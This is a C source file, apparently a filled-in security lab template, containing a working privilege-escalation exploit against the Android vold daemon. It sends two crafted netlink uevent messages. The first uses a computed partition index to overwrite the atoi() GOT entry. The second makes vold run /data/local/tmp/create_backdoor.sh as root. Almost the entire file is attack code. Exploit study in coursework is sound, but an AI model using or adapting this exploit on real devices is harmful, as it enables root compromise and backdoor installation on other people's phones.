#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/time.h>
#include <linux/netlink.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <math.h>
#include <dlfcn.h>
#include <elf.h>
#include <string.h>

static void die(const char *msg)
{
    perror(msg);
    exit(errno);
}


static int send_msgs(uint32_t idx, uint32_t pid)
{
  //*****************************************************************
    char buf[0x1000]; // buf should contain the string you crafted.
  //*****************************************************************
    
    struct sockaddr_nl snl;
    struct iovec iov = {buf, sizeof(buf)};
    struct msghdr msg = {&snl, sizeof(snl), &iov, 1, NULL, 0, 0};
    int sock = -1, n = 0;

    usleep(200000);
    memset(buf, 0, sizeof(buf));
    memset(&snl, 0, sizeof(snl));
    snl.nl_family = AF_NETLINK;

    // Open socket to talk to vold via netlink
    if ((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT)) < 0)
        die("[-] socket");

    snl.nl_pid = pid;

    //**********************************************************************
    //****Write your code here to craft first string and write into *buf****
    //**********************************************************************

    int sys = 0xafd17fd9;

    int length = sprintf(buf, "@/foo%c"
                              "ACTION=add%c"
                              "DEVPATH=/devices/platform/goldfish_mmc.0%c"
                              "SUBSYSTEM=block%c"
                              "MAJOR=179%c"
                              "MINOR=%d%c"
                              "DEVTYPE=harder%c"
                              "PARTN=%d", 0, 0, 0, 0, 0, sys, 0, 0, idx);

    //**********************************************************************
    
    msg.msg_iov->iov_len = length; /* put your first string's length here. */
    
    //**********************************************************************
    
    n = sendmsg(sock, &msg, 0);
    if (n < 0) {
        close(sock);
        return n;
    }

    printf("First message sent!\n");

    usleep(500000);

    //***************************************************************************
    //****Write your code here to craft the second string and write into *buf****
    //***************************************************************************
    length = sprintf(buf, "@/foo%c"
                          "ACTION=add%c"
                          "DEVPATH=/devices/platform/goldfish_mmc.0%c"
                          "SUBSYSTEM=block%c"
                          "MAJOR=/data/local/tmp/create_backdoor.sh%c"
                          "MINOR=1%c"
                          "DEVTYPE=harder%c"
                          "PARTN=1", 0, 0, 0, 0, 0, 0, 0);

    //**********************************************************************

    msg.msg_iov->iov_len = length; /* put your second string's length here. */

    //**********************************************************************

    n = sendmsg(sock, &msg, 0);

    close(sock);

    printf("Second message sent!\n");

    return n;
}


int main(int argc, char **argv, char **env)
{
    //****Write your code here to get user input, caculate idx and send_msgs****
    //Usage: exploit <GOT_ADDR> <PTR_ADDR> <PID_vold>
    
    //get user input
    int got_address = (int)strtol(argv[1], NULL, 16);   //GOT address
    int ptr_address = (int)strtol(argv[2], NULL, 16);   //PTR address
    uint32_t pid = (int)strtol(argv[3], NULL, 10);      //PID vold

    printf("atoi() GOT address: %x\n", got_address);
    printf("pointer address: %x\n", ptr_address);
    printf("vold pid: %d\n", pid);

    //calculate idx
    uint32_t idx = (got_address - ptr_address)/4;
    printf("idx: %d\n", idx);
    
    send_msgs(idx, pid);
    
    return 0;
}
